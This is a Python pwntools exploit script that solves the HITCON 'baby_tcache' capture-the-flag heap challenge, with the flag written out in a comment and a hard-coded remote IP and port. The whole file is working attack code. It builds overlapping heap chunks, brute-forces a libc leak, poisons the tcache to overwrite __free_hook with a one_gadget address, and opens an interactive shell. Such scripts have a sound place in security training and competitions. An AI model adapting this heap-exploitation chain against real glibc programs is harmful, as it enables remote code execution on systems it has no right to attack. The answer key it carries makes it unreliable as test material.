from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./baby_tcache"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

# flag: hitcon{He4p_ch41leng3s_4r3_n3v3r_d34d_XD}

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Your choice: ")

def newheap(conn, sz, data):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("Size:")
    conn.sendline(str(sz))
    conn.recvuntil("Data:")
    conn.send(data)

def deleteheap(conn, idx):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("Index:")
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    newheap(conn, 0x1060, "A"*10) # 0
    newheap(conn, 10, "A"*10) # 1
    newheap(conn, 0xff0, "A"*0x10) # 2
    newheap(conn, 10, "A"*10) # 3

    deleteheap(conn, 0)
    deleteheap(conn, 1)

    newheap(conn, 0x18, "A"*0x10 + p64(0x1090)) # 0

    deleteheap(conn, 2)
    deleteheap(conn, 0)

    newheap(conn, 0x1060, "A"*10) # 0
    newheap(conn, 0x1010, "\x88\xd7") # 1 -- bruteforce

    newheap(conn, 0x10, "aaa") # 2
    newheap(conn, 0x10, "\xf0") # 4

    conn.recv(5)
    libc.address = u64(conn.recv(8)) - 0x3ed8c0
    log.info("%#x", libc.address)

    newheap(conn, 0x1060, "A"*10) # 5
    newheap(conn, 64, "A"*10) # 6
    newheap(conn, 0xff0, "A"*0x10) # 7
    newheap(conn, 64, "A"*10) # 8

    deleteheap(conn, 5)
    deleteheap(conn, 6)

    newheap(conn, 0x48, "A"*0x40 + p64(0x10c0)) # 5

    deleteheap(conn, 7)
    deleteheap(conn, 5)

    newheap(conn, 0x1060, "/bin/sh") # 5
    newheap(conn, 0x1010, p64(libc.symbols['__free_hook']))

    newheap(conn, 0x40, "aaa")
    newheap(conn, 0x40, p64(libc.address + 0x4f322)) # one_gadget

    deleteheap(conn, 5)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("52.68.236.186", 56746)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
